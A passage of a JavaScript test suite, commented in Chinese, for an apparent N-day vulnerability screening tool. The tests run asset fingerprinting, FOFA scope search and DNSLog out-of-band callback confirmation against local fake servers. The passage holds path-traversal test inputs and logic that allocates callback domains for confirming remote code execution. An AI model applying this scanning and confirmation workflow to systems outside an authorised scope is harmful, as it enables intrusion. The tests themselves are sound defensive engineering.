        JSON.stringify({ error: hunted.error, batchCalls: batchCalls.length }))
      expect('范围搜索向宿主嵌套执行传递 call/root id、父令牌与取消信号',
        nestedDispatch?.callId?.startsWith('nday-asset-batch-')
        && nestedDispatch.rootCallId === outerCallId
        && nestedDispatch.parent === outerToken
        && nestedDispatch.signal === outerSignal,
        JSON.stringify({ callId: nestedDispatch?.callId, rootCallId: nestedDispatch?.rootCallId }))
      const searchEvidence = JSON.parse(fs.readFileSync(path.join(workspace, hunted.file), 'utf8'))
      expect('搜索证据把每个被动候选映射到真实目录 entryId',
        searchEvidence.schema === 'saker.nday-scope-hunt/1'
        && searchEvidence.candidates[0].entryIds.includes(mappedEntryId)
        && searchEvidence.candidates[0].queryIds.length === 1)

      const screened = await matchTool.execute({
        assetSource: 'nday-search', searchId: hunted.searchId,
        scope: '127.0.0.1', workspace, entryIds: mappedEntryId, rate: 100,
      })
      expect('搜索结果到 nday_match 闭环只筛候选实际映射的条目与本地范围资产',
        screened.ok && screened.parameters.assetSource === 'nday-search'
        && screened.parameters.searchId === hunted.searchId
        && screened.summary.assets === 1 && screened.summary.entries === 1
        && screened.summary.requests === probePlan(mappedEntry, `http://127.0.0.1:${lookPort}`).length,
        JSON.stringify({ error: screened.error, summary: screened.summary }))
      const invented = await matchTool.execute({
        assetSource: 'nday-search', searchId: hunted.searchId,
        scope: '127.0.0.1', workspace, entryIds: 'not-mapped-entry',
      })
      expect('搜索证据的 entry 映射缺失时拒绝，不退化为全目录探测',
        invented.ok === false && /没有同时处于当前精确范围且匹配/.test(invented.error), invented.error)
      const callsBeforeEnd = batchCalls.length
      const ended = await scopeHunt.execute({
        scope: '127.0.0.1', workspace, entryIds: mappedEntryId,
        limit: 1, offset: singleEntryPlan.queryGroups,
      })
      expect('超出总查询组时明确返回末页并且不再调用 FOFA',
        ended.ok && ended.nextOffset === null && ended.text.includes('nextOffset=null')
        && ended.text.includes('请停止') && batchCalls.length === callsBeforeEnd,
        JSON.stringify({ text: ended.text, batchCalls: batchCalls.length }))
      const traversal = await matchTool.execute({
        assetSource: 'nday-search', searchId: '..\\..\\outside',
        scope: '127.0.0.1', workspace,
      })
      expect('nday-search searchId 不允许路径穿越', traversal.ok === false && traversal.error.includes('有效 searchId'))

      const originalExecute = ndayCtx.tools.execute
      ndayCtx.tools.execute = async () => ({
        isError: true,
        error: { code: 'INVALID_ARGUMENTS', message: 'nested arguments rejected' },
        content: [],
      })
      try {
        const nestedFailure = await scopeHunt.execute({
          scope: '127.0.0.1', workspace, entryIds: mappedEntryId,
          limit: 1, offset: Math.max(0, singleEntryPlan.queryGroups - 1),
        }, { callId: outerCallId, rootCallId: outerCallId, token: outerToken, signal: outerSignal })
        expect('宿主嵌套工具结构化失败对模型给出可读原因',
          nestedFailure.ok === false && nestedFailure.error.includes('nested arguments rejected')
          && nestedFailure.text.includes('nextOffset=null') && nestedFailure.text.includes('停止'),
          JSON.stringify({ error: nestedFailure.error, text: nestedFailure.text }))
      } finally {
        ndayCtx.tools.execute = originalExecute
      }
    } finally {
      ndayBatchSearchHandler = null
    }
  }
  const out = await matchTool.execute({
    targets: `http://127.0.0.1:${lookPort}, http://127.0.0.1:${plainPort}`,
    workspace,
    entryIds: 'tongtech-tongweb-ejb-deserialization',
  })
  expect('匹配工具执行成功', out.ok, out.error)
  expect('像个像 TongWeb 的资产被判为 fingerprint-medium',
    out.rows.some((row) => row.asset.includes(String(lookPort)) && row.verdict === VERDICT.MEDIUM),
    JSON.stringify(out.rows.map((x) => [x.asset, x.verdict])))
  expect('普通 404 站点不产生命中',
    !out.rows.some((row) => row.asset.includes(String(plainPort))))
  expect('模型侧文本明写"不是漏洞结论"', out.text.includes('不是漏洞结论'), out.text.slice(0, 160))
  expect('模型侧文本提示条目未复现', out.text.includes('尚未复现') || out.text.includes('normalized'))
  expect('命中行给出下一步（公开工具）',
    out.rows.every((row) => typeof row.nextStep === 'string' && row.nextStep.length > 0))
  // 速率纪律：并发数不等于速率。并发 4 遇到 20ms 响应就是 ~200 req/s，
  // 对着带 WAF 的目标就是自曝——所以必须有独立的速率闸门，且默认值要留痕。
  expect('默认按保守速率跑并在结果里留痕',
    out.parameters.rate === 15 && String(out.parameters.rateNote).includes('保守默认'),
    JSON.stringify(out.parameters))
  expect('模型侧文本写明生效速率', out.text.includes('【速率】') && out.text.includes('15 req/s'))
  {
    const started = Date.now()
    const throttled = await matchTool.execute({
      targets: `http://127.0.0.1:${lookPort}, http://127.0.0.1:${plainPort}`,
      workspace,
      entryIds: 'tongtech-tongweb-ejb-deserialization',
      rate: 4,
    })
    const elapsed = Date.now() - started
    expect('速率闸门真的把请求拉开了（4 req/s × 6 次探测 ≥ 1s）',
      throttled.ok && elapsed >= 1000, `${elapsed}ms`)
    // 调**低**不是「放开」——它只会更保守，不该被标成显式放开。
    expect('调低速率照实生效，不算「放开」',
      throttled.parameters.rate === 4 && !String(throttled.parameters.rateNote).includes('显式放开'),
      JSON.stringify(throttled.parameters))
  }
  // 软 404 / SPA / WAF 统一响应：所有路径都 200 + 同一张通用页。
  // 语料里 53/63 条探针只看状态码，没有对照的话一台这种目标能让整库假命中
  // （实测：软 404 靶子上 3/3 条目全部"命中"）。
  {
    const soft = startSoft404()
    const softPort = await listen(soft)
    try {
      const softOut = await matchTool.execute({
        targets: `http://127.0.0.1:${softPort}`,
        workspace,
        entryIds: 'tongtech-tongweb-ejb-deserialization',
      })
      expect('软 404 目标上不许假命中', softOut.ok === true && softOut.rows.length === 0, JSON.stringify(softOut.rows))
      expect('软 404 目标上如实说明「对照路径同样满足」',
        softOut.text.includes('【对照】') && softOut.text.includes('不具区分度'), softOut.text.slice(0, 220))
      expect('对照请求与抑制条数进 summary（可核对）',
        softOut.summary?.controlRequests === 1 && softOut.summary?.controlSuppressed === 2,
        JSON.stringify(softOut.summary))
    } finally {
      await close(soft)
    }
  }
  // vhost：账本里 target 是 IP、host 是域名 —— 探针必须发 `Host: <域名>`，否则打到默认站点。
  // 护网里 FOFA/Hunter 给的正是「IP + 域名」这种组合。
  {
    const vhost = startVhost()
    const vhostPort = await listen(vhost)
    const vhostWs = fs.mkdtempSync(path.join(os.tmpdir(), 'nday-vhost-ws-'))
    try {
      fs.writeFileSync(path.join(vhostWs, 'asset-inventory.json'), JSON.stringify({
        schema: 'saker.asset-inventory/1',
        updatedAt: new Date().toISOString(),
        assets: [
          { id: 'asset-vhost', target: `http://127.0.0.1:${vhostPort}`, host: 'vhost.test', port: vhostPort, sources: ['test'] },
          { id: 'asset-vhost-out', target: `http://127.0.0.1:${vhostPort}`, host: 'evil.test', port: vhostPort, sources: ['test'] },
        ],
      }))
      const vhostOut = await matchTool.execute({
        assetSource: 'inventory',
        workspace: vhostWs,
        scope: 'vhost.test',
        entryIds: 'tongtech-tongweb-ejb-deserialization',
      })
      const vhostRow = (vhostOut.rows ?? [])[0]
      const fired = new Set((vhostRow?.evidence ?? []).map((e) => e.probeId))
      expect('vhost：账本 target=IP + host=域名 时能命中（Host 按账本发）',
        vhostOut.ok === true && vhostRow !== undefined && fired.size === 3,
        JSON.stringify(vhostOut.rows ?? []))
      expect('vhost：范围外的同 IP 虚拟主机被排除且没有探测请求',
        vhostOut.summary?.assets === 1 && vhostOut.summary?.assetsExcludedByScope === 1
        && vhostOut.text.includes('范围外跳过 1 项'), JSON.stringify(vhostOut.summary))
    } finally {
      await close(vhost)
      fs.rmSync(vhostWs, { recursive: true, force: true })
    }
  }
  // SPA（try_files 兜底）：任何路径都返回同一张带产品标题的页。
  // 内容判据（产品品牌）在统一响应下**仍要保留命中**——压制会把真实部署判成没命中；
  // 但必须如实标注「只作产品特征，不能当路径存在的证据」。
  {
    const spa = startSpa()
    const spaPort = await listen(spa)
    try {
      const spaOut = await matchTool.execute({
        targets: `http://127.0.0.1:${spaPort}`,
        workspace,
        entryIds: 'aj-report-auth-bypass-rce',
      })
      const spaRow = (spaOut.rows ?? [])[0]
      expect('SPA 兜底：内容判据仍能识别产品（不被随机对照误杀）',
        spaOut.ok === true && spaRow !== undefined
        && (spaRow.evidence ?? []).some((e) => e.probeId === 'aj-report-home'),
        JSON.stringify(spaOut.rows ?? []))
      expect('SPA 兜底：如实标注「只作产品特征」，同时仍抑制纯状态判据',
        spaOut.summary?.controlUniform === 1 && spaOut.summary?.controlSuppressed === 1
        && spaOut.text.includes('【统一响应】') && spaOut.text.includes('不能当路径存在的证据'),
        JSON.stringify(spaOut.summary))
    } finally {
      await close(spa)
    }
  }
  // 账本 port 是独立字段：target 不带端口时必须按 port 探测（否则落到默认端口、全拒连）。
  {
    const lookForPort = startLookalike()
    const lookForPortPort = await listen(lookForPort)
    const portWs = fs.mkdtempSync(path.join(os.tmpdir(), 'nday-port-ws-'))
    try {
      fs.writeFileSync(path.join(portWs, 'asset-inventory.json'), JSON.stringify({
        schema: 'saker.asset-inventory/1',
        updatedAt: new Date().toISOString(),
        assets: [{ id: 'asset-port', target: '127.0.0.1', host: '127.0.0.1', port: lookForPortPort, sources: ['test'] }],
      }))
      const portOut = await matchTool.execute({
        assetSource: 'inventory',
        workspace: portWs,
        entryIds: 'tongtech-tongweb-ejb-deserialization',
      })
      expect('账本 port 独立字段：target 不带端口时按 port 探测（不落到默认端口）',
        portOut.ok === true && portOut.summary?.transportErrors === 0 && portOut.summary?.screenedHits === 1,
        JSON.stringify(portOut.summary))
    } finally {
      await close(lookForPort)
      fs.rmSync(portWs, { recursive: true, force: true })
    }
  }
  // 探针直连（node:http/https 不读 HTTP_PROXY）：设了代理变量时**如实报出**，且**不改道**。
  // 为什么不改道：多数人设代理只为上外网，把探针塞进代理会让内网目标探不通。
  {
    const proxyProbeServer = startLookalike()
    const proxyProbePort = await listen(proxyProbeServer)
    const proxyWs = fs.mkdtempSync(path.join(os.tmpdir(), 'nday-proxy-note-'))
    const prevProxy = process.env.HTTP_PROXY
    try {
      process.env.HTTP_PROXY = 'http://127.0.0.1:9' // 故意指向死端口：若真走代理必然失败
      const proxyOut = await matchTool.execute({
        targets: `http://127.0.0.1:${proxyProbePort}`,
        workspace: proxyWs,
        entryIds: 'tongtech-tongweb-ejb-deserialization',
      })
      expect('探针直连：设了代理变量时输出如实报出（不静默绕过）',
        proxyOut.ok === true && (proxyOut.summary?.proxyEnv ?? []).includes('HTTP_PROXY')
        && String(proxyOut.text).includes('但探针走**直连**'),
        JSON.stringify(proxyOut.summary))
      expect('探针直连：设了代理也不改道（仍直连命中本地靶子）',
        proxyOut.summary?.transportErrors === 0 && proxyOut.summary?.screenedHits === 1,
        JSON.stringify(proxyOut.summary))
    } finally {
      if (prevProxy === undefined) delete process.env.HTTP_PROXY
      else process.env.HTTP_PROXY = prevProxy
      await close(proxyProbeServer)
      fs.rmSync(proxyWs, { recursive: true, force: true })
    }
  }
  {
    const clamped = await matchTool.execute({
      targets: `http://127.0.0.1:${plainPort}`,
      workspace,
      entryIds: 'tongtech-tongweb-ejb-deserialization',
      rate: 9999,
    })
    expect('速率有硬上限，不能被调成无限快', clamped.parameters.rate === 100, JSON.stringify(clamped.parameters))
    expect('放开速率会被留痕', String(clamped.parameters.rateNote).includes('显式放开'))
  }

  // 泛微 e-cology 条目：只有端点存在性这类弱信号，命中必须老实标 fingerprint-weak。
  const weaver = await matchTool.execute({
    targets: `http://127.0.0.1:${ecologyPort}`,
    workspace,
    entryIds: 'weaver-ecology-dubboapi-debug-rce',
  })
  expect('泛微条目对暴露 debug 路径的站点产生弱命中',
    weaver.rows.length === 1 && weaver.rows[0].verdict === VERDICT.WEAK,
    JSON.stringify(weaver.rows.map((r) => [r.entryId, r.verdict])))
  expect('弱命中不会升级成更高级结论',
    weaver.rows.every((row) => row.strongest === 'weak'))

  // 致远 ajax.do：空指针签名属于 medium 级——比"路径存在"强，但仍是筛选信号。
  const seeyonOut = await matchTool.execute({
    targets: `http://127.0.0.1:${seeyonPort}`,
    workspace,
    entryIds: 'seeyon-oa-ajaxdo-file-upload',
  })
  expect('致远条目命中并判为 fingerprint-medium',
    seeyonOut.rows.length === 1 && seeyonOut.rows[0].verdict === VERDICT.MEDIUM,
    JSON.stringify(seeyonOut.rows.map((r) => [r.entryId, r.verdict])))
  expect('命中证据里带 NPE 签名探针',
    seeyonOut.rows[0].evidence.some((e) => e.probeId === 'ajax-do-npe'),
    JSON.stringify(seeyonOut.rows[0].evidence))

  // 金蝶 kdsvc：只有端点存在性，必须是 weak；且不能把致远/泛微条目带上。
  const kdOut = await matchTool.execute({
    targets: `http://127.0.0.1:${kingdeePort}`,
    workspace,
    entryIds: 'kingdee-cloud-starry-sky-kdsvc-binaryformatter-rce',
  })
  expect('金蝶条目命中并如实判为 fingerprint-weak',
    kdOut.rows.length === 1 && kdOut.rows[0].verdict === VERDICT.WEAK,
    JSON.stringify(kdOut.rows.map((r) => [r.entryId, r.verdict])))

  const ledgerPath = path.join(workspace, out.ledger)
  expect('台账 JSON 落盘', fs.existsSync(ledgerPath))
  const ledger = JSON.parse(fs.readFileSync(ledgerPath, 'utf8'))
  expect('台账记录了参数与汇总', ledger.summary.assets === 2 && ledger.summary.screenedHits === out.rows.length)
  expect('台账不含任何 payload 字段',
    !JSON.stringify(ledger).match(/payload|exploitBody|command/i))
  expect('evidence-index 追加了一行',
    fs.readFileSync(path.join(workspace, 'evidence-index.md'), 'utf8').includes('nday_match'))

  fs.writeFileSync(path.join(workspace, 'asset-inventory.json'), JSON.stringify({
    schema: 'saker.asset-inventory/1',
    updatedAt: new Date().toISOString(),
    assets: [
      { id: 'asset-look', target: `http://127.0.0.1:${lookPort}`, host: '127.0.0.1', port: lookPort, sources: ['test'] },
      { id: 'asset-plain', target: `http://127.0.0.1:${plainPort}`, host: '127.0.0.1', port: plainPort, sources: ['test'] },
    ],
  }, null, 2))
  const fromInventory = await matchTool.execute({
    workspace,
    assetSource: 'inventory',
    entryIds: 'tongtech-tongweb-ejb-deserialization',
  })
  expect('nday_match 可直接读取资产账本', fromInventory.ok && fromInventory.summary.assets === 2, JSON.stringify(fromInventory.summary))
  expect('账本来源的命中仍保持正确结论',
    fromInventory.rows.some((row) => row.asset.includes(String(lookPort)) && row.verdict === VERDICT.MEDIUM),
    JSON.stringify(fromInventory.rows))

  // 没有探针的条目（legacy-unreviewed）必须被**显式跳过并报出来**——
  // 静默跳过会让调用方以为"全都筛过了"，那正是这套语料最该避免的误导。
  const allEntries = await matchTool.execute({
    targets: `http://127.0.0.1:${lookPort}`,
    workspace,
  })
  expect('不带 entryIds 时仍能跑（只跑有探针的条目）', allEntries.ok, allEntries.error)
  expect('没有探针的条目被显式报为跳过',
    allEntries.summary.entriesNotSiftable >= 1 && allEntries.text.includes('跳过'),
    JSON.stringify(allEntries.summary))
  expect('跳过的条目不会出现在请求计划里',
    !allEntries.text.includes('seeyon-oa-workflow-importprocess-rce')
    || allEntries.text.includes('跳过'))
  expect('每个命中行都带确认计划（需要带外的标未就绪，不需要的如实说不含带外）',
    allEntries.rows.length > 0 && allEntries.rows.every((row) => row.confirm && typeof row.confirm.note === 'string'),
    JSON.stringify(allEntries.rows.map((row) => row.confirm)))
  expect('需要带外但未配置的，确认计划指出该去配置什么',
    allEntries.rows.filter((row) => row.confirm?.needed === true)
      .every((row) => row.confirm.ready === false && String(row.confirm.note).includes('DNSLog')),
    JSON.stringify(allEntries.rows.filter((row) => row.confirm?.needed === true).map((row) => row.confirm)))

  const tooMany = await matchTool.execute({
    targets: Array.from({ length: 400 }, (_, i) => `h${i}.test`).join(','),
    workspace,
  })
  expect('超出单次规模上限时明确拒绝而不是静默截断',
    tooMany.ok === false && tooMany.error.includes('超过单次上限'), tooMany.error)

  const noTargets = await matchTool.execute({ targets: '  ', workspace })
  expect('空目标列表报错', noTargets.ok === false)
} finally {
  await close(look)
  await close(plain)
  await close(ecology)
  await close(seeyon)
  await close(kingdee)
  fs.rmSync(workspace, { recursive: true, force: true })
}

// ── 7. 带外确认原语（本地假 DNSLog 平台，不发任何真实请求） ────────────────────
const oobUnconfigured = toolDefs.get('oob_probe')
expect('注册了 oob_probe', oobUnconfigured !== undefined)
{
  // toolDefs 是用**没有 settings** 的 ctx 注册的——正是"没配过"的形态。
  const out = await oobUnconfigured.execute({ action: 'new' })
  expect('未配置带外通道时诚实拒绝', out.ok === false)
  expect('拒绝信息点名缺哪几项（含接收域名）',
    out.error.includes('接收域名') && out.error.includes('token') && out.error.includes('平台地址'), out.error)
}

/** 假 CEYE 兼容平台：GET /v1/records?token=&type=dns&filter= → { meta, data } */
function startFakeDnslog(records) {
  return http.createServer((req, res) => {
    const u = new URL(req.url, 'http://placeholder')
    if (!u.pathname.endsWith('/v1/records')) { res.writeHead(404); res.end('nope'); return }
    if (u.searchParams.get('token') !== 'test-token') {
      res.writeHead(401, { 'content-type': 'application/json' }); res.end('{"meta":{"code":401}}'); return
    }
    const filter = u.searchParams.get('filter') || ''
    const data = records.filter((r) => String(r.name).startsWith(filter))
    res.writeHead(200, { 'content-type': 'application/json' })
    res.end(JSON.stringify({ meta: { code: 200 }, data }))
  })
}

const dnslog = startFakeDnslog([{ name: 'saker-deadbeef.oob.test', remote_addr: '203.0.113.7', timestamp: 1 }])
const htmlServer = http.createServer((_req, res) => { res.writeHead(200, { 'content-type': 'text/html' }); res.end('<html>not json</html>') })
const dnsPort = await listen(dnslog)
const htmlPort = await listen(htmlServer)

try {
  const configured = new Map()
  apply({
    tools: { register: (def) => configured.set(def.name, withTestScope(def)) },
    settings: {
      get: (ns) => (ns === 'sec-config'
        ? { dnslog: { url: `http://127.0.0.1:${dnsPort}`, token: 'test-token', domain: 'oob.test' } }
        : undefined),
    },
  })
  const oob = configured.get('oob_probe')
  expect('配置后仍注册 oob_probe', oob !== undefined)

  const allocated = await oob.execute({ action: 'new' })
  expect('new 返回 label 与待注入域名', allocated.ok && /^saker-[0-9a-f]{8}$/.test(allocated.label), allocated.label)
  expect('注入域名落在配置的接收域名之下', allocated.domain === `${allocated.label}.oob.test`)
  expect('new 明确说明「回连≠拿到权限」', allocated.text.includes('不等于'))

  const noLabel = await oob.execute({ action: 'check' })
  expect('check 缺 label 时拒绝（不给"看到别人记录就算命中"的假阳性）',
    noLabel.ok === false && noLabel.error.includes('label'), noLabel.error)
  const badLabel = await oob.execute({ action: 'check', label: '../../etc' })
  expect('check 拒绝非法 label', badLabel.ok === false)

  const miss = await oob.execute({ action: 'check', label: 'saker-00000000' })
  expect('无回连时 hit=false', miss.ok === true && miss.hit === false)
  expect('未回连文案提醒「未回连 ≠ 不存在」', miss.text.includes('≠ 不存在'))

  const got = await oob.execute({ action: 'check', label: 'saker-deadbeef' })
  expect('有回连时 hit=true 且给出记录', got.ok === true && got.hit === true && got.count === 1, JSON.stringify(got.records))
  expect('回连文案不说成"已拿到权限"', got.text.includes('别把回连写成'))

  // ── 批量 OOB：同指纹多资产，回连要能**归因到具体哪几台** ────────────────────
  // 方案验收那条「一次会话能对同一指纹的多个资产批量 OOB 验证，并输出命中清单」。
  // 共用同一个域名时，回连只能证明「这一类里有某个触发了」，答不出「是哪几台」；
  // 所以这里每个资产分一个带序号后缀的子域名，靠后缀归因。
  {
    const records = []
    const batchDns = startFakeDnslog(records)
    const batchPort = await listen(batchDns)
    const batchWorkspace = fs.mkdtempSync(path.join(os.tmpdir(), 'nday-oob-batch-'))
    try {
      const batchTools = new Map()
      apply({
        tools: { register: (def) => batchTools.set(def.name, withTestScope(def)) },
        settings: {
          get: (ns) => (ns === 'sec-config'
            ? { dnslog: { url: `http://127.0.0.1:${batchPort}`, token: 'test-token', domain: 'oob.test' } }
            : undefined),
        },
      })
      const oobBatch = batchTools.get('oob_probe')

      const noWorkspace = await oobBatch.execute({ action: 'batch', assets: 'a.test,b.test' })
      expect('batch 缺 workspace 时拒绝（没有归因表就归不了因）',
        noWorkspace.ok === false && noWorkspace.error.includes('workspace'), noWorkspace.error)

      const batch = await oobBatch.execute({
        action: 'batch',
        assets: 'http://a.test,http://b.test,http://c.test,http://d.test,http://e.test',
        workspace: batchWorkspace,
      })
      expect('batch 为每个资产各分配一个子域名',
        batch.ok === true && batch.rows.length === 5 && new Set(batch.rows.map((r) => r.domain)).size === 5,
        JSON.stringify(batch.rows))
      expect('子域名共用同一 label 前缀、按序号区分',
        batch.rows.every((r, i) => r.domain === `${batch.label}-${i + 1}.oob.test`), JSON.stringify(batch.rows))
      expect('归因表落盘（check 靠它归因）',
        fs.existsSync(path.join(batchWorkspace, '.saker', `oob-batch-${batch.label}.json`)))

      // 只让第 2 台与第 4 台回连
      records.push({ name: batch.rows[1].domain, remote_addr: '203.0.113.11', timestamp: 1 })
      records.push({ name: batch.rows[3].domain, remote_addr: '203.0.113.12', timestamp: 2 })

      const checked = await oobBatch.execute({ action: 'check', label: batch.label, workspace: batchWorkspace })
      const expected = [batch.rows[1].asset, batch.rows[3].asset]
      expect('批量回连条数 = 真正回连的台数（2）', checked.ok === true && checked.count === 2, JSON.stringify(checked.records))
      expect('归因到具体资产：命中清单正好是那 2 台',
        JSON.stringify([...checked.hitAssets].sort()) === JSON.stringify([...expected].sort()),
        `hit=${JSON.stringify(checked.hitAssets)} expected=${JSON.stringify(expected)}`)
      expect('没回连的资产不进命中清单',
        !checked.hitAssets.includes(batch.rows[0].asset) && !checked.hitAssets.includes(batch.rows[4].asset))
      expect('批量文案同样不说成"已拿到权限"', checked.text.includes('不等于已拿到权限'))
    } finally {
      await new Promise((resolve) => batchDns.close(resolve))
      fs.rmSync(batchWorkspace, { recursive: true, force: true })
    }
  }

  // 命中即预分配（**批量归因**）：配好 DNSLog 后，nday_match 的命中行应直接给出可注入域名，
  // 而且**同一批命中共用一个 label**——这样一次 check 就能拿到整张命中清单，
  // 而不是每台各发一个 label、再手动 check N 次。
  const confirmA = startLookalike()
  const confirmB = startLookalike()
  const confirmPortA = await listen(confirmA)
  const confirmPortB = await listen(confirmB)
  const confirmWorkspace = fs.mkdtempSync(path.join(os.tmpdir(), 'nday-confirm-'))
  try {
    const matched = await configured.get('nday_match').execute({
      targets: `http://127.0.0.1:${confirmPortA},http://127.0.0.1:${confirmPortB}`,
      workspace: confirmWorkspace,
      entryIds: 'tongtech-tongweb-ejb-deserialization',
    })
    const confirms = matched.rows.map((row) => row.confirm)
    expect('配好带外后，命中行直接给出可注入域名与下一步调用',
      matched.rows.length === 2
      && confirms.every((c) => c?.ready === true && /^saker-[0-9a-f]{8}$/.test(c.label))
      && confirms.every((c) => /^saker-[0-9a-f]{8}-\d+\.oob\.test$/.test(c.domain))
      && confirms.every((c) => c.nextCall.includes(c.label) && c.nextCall.includes(confirmWorkspace)),
      JSON.stringify(confirms))
    expect('同一批命中共用一个 label（一次 check 拿全清单）',
      new Set(confirms.map((c) => c.label)).size === 1
      && confirms.every((c) => c.sharedWith === 2)
      && new Set(confirms.map((c) => c.domain)).size === 2,
      JSON.stringify(confirms))
    if (confirms.length > 0) {
      const tableFile = path.join(confirmWorkspace, '.saker', `oob-batch-${confirms[0].label}.json`)
      const table = JSON.parse(fs.readFileSync(tableFile, 'utf8'))
      expect('归因表落盘，且每行域名与命中行一一对应',
        table.rows.length === 2 && confirms.every((c) => table.rows.some((r) => r.domain === c.domain)),
        JSON.stringify(table.rows))
    }
    expect('模型侧文本里也带上确认入口', matched.text.includes('.oob.test'))
    expect('命中行带上扩面入口（有测绘语法就给查询、没有就如实说反查不了）',
      matched.rows.length > 0 && matched.rows.every((row) => row.expand !== undefined
        && (row.expand.queries.length > 0
          ? row.expand.nextCall.includes('nday_scope_hunt')
          : typeof row.expand.note === 'string')),
      JSON.stringify(matched.rows.map((row) => row.expand)))
    // ⚠ 关键：`nday_match` 的 render 只输出 `v.text`，结构化字段模型**看不到**。
    // 所以扩面入口必须落在文本里——只断言 rows[].expand 会给出**假绿**（这条我踩过一次）。
    expect('派生的探针指纹扩面入口写进了模型实际读到的文本（render 只输出 text）',
      matched.text.includes('扩面：') && matched.text.includes('nday_scope_hunt'),
      matched.text.slice(0, 300))
  } finally {
    await close(confirmA)
    await close(confirmB)
    fs.rmSync(confirmWorkspace, { recursive: true, force: true })
  }

  // 正例：条目**有**测绘语法时，扩面查询必须出现在模型读到的文本里。
  {
    const tplus = http.createServer((req, res) => {
      const p = new URL(req.url ?? '/', 'http://x').pathname
      if (p.startsWith('/tplus/ajaxpro/')) { res.writeHead(500); res.end('err'); return }
      res.writeHead(404); res.end('not found')
    })
    const tplusPort = await listen(tplus)
    const tplusWs = fs.mkdtempSync(path.join(os.tmpdir(), 'nday-expand-'))
    try {
      const hit = await configured.get('nday_match').execute({
        targets: `http://127.0.0.1:${tplusPort}`,
        workspace: tplusWs,
        entryIds: 'chanjet-tplus-loginmanager-sqli',
      })
      expect('有测绘语法时，FOFA 范围扩面调用出现在模型读到的文本里',
        hit.ok && hit.text.includes('扩面：') && hit.text.includes('nday_scope_hunt entryIds=')
        && hit.text.includes('scope='),
        hit.text.slice(0, 400))
      // README 的表格写着「命中行直接给出条目 exploit.tools 里点名的公开工具」——
      // 而 nextStep 此前只写在返回对象里，模型看不到。这条钉住它必须进文本。
      expect('交接工具（exploit.tools）也写进模型读到的文本里',
        hit.text.includes('交接：') && hit.text.includes('nuclei 模板 chanjet-tplus-ufida-sqli'),
        hit.text.slice(0, 500))
    } finally {
      await close(tplus)
      fs.rmSync(tplusWs, { recursive: true, force: true })
    }
  }

  // 短名单排序：强命中必须排在弱命中前面——否则操作者要从上百行里翻，
  // 而真正该先看的那几行埋在最后。
  {
    const mk = (withBrand) => http.createServer((req, res) => {
      const p = new URL(req.url ?? '/', 'http://x').pathname
      if (p === '/') {
        if (!withBrand) { res.writeHead(404); res.end('nf'); return }
        res.writeHead(200, { 'content-type': 'text/html' }); res.end('<title>YonBIP 数据应用服务</title>'); return
      }
      if (p.startsWith('/bi/api/Portal/LoginWithV8/')) { res.writeHead(200); res.end('{}'); return }
      res.writeHead(404); res.end('nf')
    })
    const mediumSrv = mk(true)
    const weakSrv = mk(false)
    const mediumPort = await listen(mediumSrv)
    const weakPort = await listen(weakSrv)
    const sortWs = fs.mkdtempSync(path.join(os.tmpdir(), 'nday-sort-'))
    try {
      // 故意把**弱**那台放在前面：不排序的话 rows[0] 就是弱的
      const out = await configured.get('nday_match').execute({
        targets: `http://127.0.0.1:${weakPort},http://127.0.0.1:${mediumPort}`,
        workspace: sortWs,
        entryIds: 'yonyou-yonbip-loginwithv8-path-traversal',
      })
      expect('短名单按证据强度排：medium 命中排在 weak 前面',
        out.ok && out.rows.length === 2
        && out.rows[0].asset === `http://127.0.0.1:${mediumPort}` && out.rows[0].strongest === 'medium'
        && out.rows[1].asset === `http://127.0.0.1:${weakPort}` && out.rows[1].strongest === 'weak',
        JSON.stringify(out.rows.map((r) => [r.asset, r.strongest])))
    } finally {
      await close(mediumSrv)
      await close(weakSrv)
      fs.rmSync(sortWs, { recursive: true, force: true })
    }
  }

  // 命中行也要标出「自动导入·未复核」：语料里 215 条是机器批量导入的，
  // 不标出来模型会以为它们和逐条复核过的条目同等可信。
  {
    const auto = http.createServer((req, res) => {
      const p = new URL(req.url ?? '/', 'http://x').pathname
      if (p === '/e/ViewImg/index.html') {
        // 该条目的 medium 判据要求响应体含模板里的静态串，靶机要照它造
        res.writeHead(200, { 'content-type': 'text/html' }); res.end('<html>if(Request("url")!=0)</html>'); return
      }
      res.writeHead(404); res.end('nf')
    })
    const autoPort = await listen(auto)
    const autoWs = fs.mkdtempSync(path.join(os.tmpdir(), 'nday-auto-'))
    try {
      const out = await configured.get('nday_match').execute({
        targets: `http://127.0.0.1:${autoPort}`,
        workspace: autoWs,
        entryIds: 'cnvd-2021-15824',
      })
      expect('命中行标出「自动导入·未复核」',
        out.ok && out.rows.length === 1 && out.rows[0].autoImported === true
        && out.text.includes('（自动导入·未复核）'),
        out.text.slice(0, 300))
    } finally {
      await close(auto)
      fs.rmSync(autoWs, { recursive: true, force: true })
    }
  }

  // 平台返回认不出的内容时，宁可失败，也不把错误页当命中。
  const bogus = new Map()
  apply({
    tools: { register: (def) => bogus.set(def.name, withTestScope(def)) },
    settings: {
      get: (ns) => (ns === 'sec-config'
        ? { dnslog: { url: `http://127.0.0.1:${htmlPort}`, token: 'test-token', domain: 'oob.test' } }
        : undefined),
    },
  })
  const bad = await bogus.get('oob_probe').execute({ action: 'check', label: 'saker-00000000' })
  expect('平台响应认不出时失败而不是假命中',
    bad.ok === false && bad.error.includes('无法识别'), bad.error)
} finally {
  await close(dnslog)
  await close(htmlServer)
}

// ── 8. 交接层：用**用户自己已有的模板库**给出可执行计划 ────────────────────────
{
  const { resolveNucleiTemplatesDir, matchNucleiTemplates } = await import('../lib/index.js')
  const home = fs.mkdtempSync(path.join(os.tmpdir(), 'nday-home-'))
  const realTpl = path.join(home, 'real-templates')
  const linkTpl = path.join(home, '.config', 'nuclei', 'templates')
  fs.mkdirSync(path.join(realTpl, 'http', 'vulnerabilities', 'weaver', 'ecology'), { recursive: true })
  fs.writeFileSync(path.join(realTpl, 'http', 'vulnerabilities', 'weaver', 'ecology', 'ecology-execforstr-rce.yaml'), 'id: x')
  fs.writeFileSync(path.join(realTpl, 'http', 'vulnerabilities', 'weaver', 'weaver-checkserver-sqli.yaml'), 'id: y')
  // 「无关」必须放在厂商目录**外**——放在 weaver/ 里的模板本来就属该厂商，匹配到是对的
  fs.mkdirSync(path.join(realTpl, 'http', 'misconfiguration'), { recursive: true })
  fs.writeFileSync(path.join(realTpl, 'http', 'misconfiguration', 'other-product-info-leak.yaml'), 'id: z')
  // 实测踩到的假阳性：关键词 weaver 的裸子串会命中 SAP NetWeaver
  fs.mkdirSync(path.join(realTpl, 'http', 'exposed-panels'), { recursive: true })
